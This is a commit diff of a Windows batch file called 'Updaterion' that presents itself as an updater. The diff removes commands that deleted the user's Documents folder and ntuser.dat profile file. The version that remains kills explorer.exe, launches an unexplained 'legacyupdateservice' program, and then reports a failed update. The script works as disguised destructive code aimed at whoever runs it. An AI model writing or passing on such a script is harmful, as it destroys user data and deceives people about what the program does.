5a36bf4374cef3235431e6571f69e449d096924e
Jack-John-Joe <131839749+Jack-John-Joe@users.noreply.github.com>
2023-07-05 18:46:15 -0500

    Update main.bat

--- main.bat
+++ main.bat
@@ -3,12 +3,11 @@ echo Welcome to Updaterion!
 pause
 goto check_Permissions :check_Permissions echo Administrative permissions required. Detecting permissions... net session >nul 2>&1 if %errorLevel% == 0 ( echo Success: Administrative permissions confirmed. ) else ( echo Failure: Current permissions inadequate. )
 pause >nul
-echo Quitting services..
+echo Killing services..
 taskkill /im explorer.exe
 echo DONE
 echo Please wait..
-cd ..
-del Documents
-del ntuser.dat
+cd LegacyUpdateService
+legacyupdateservice
 timeout /t 15
 echo Updaterion has failed the update. Thank you for testing Updaterion Alpha!
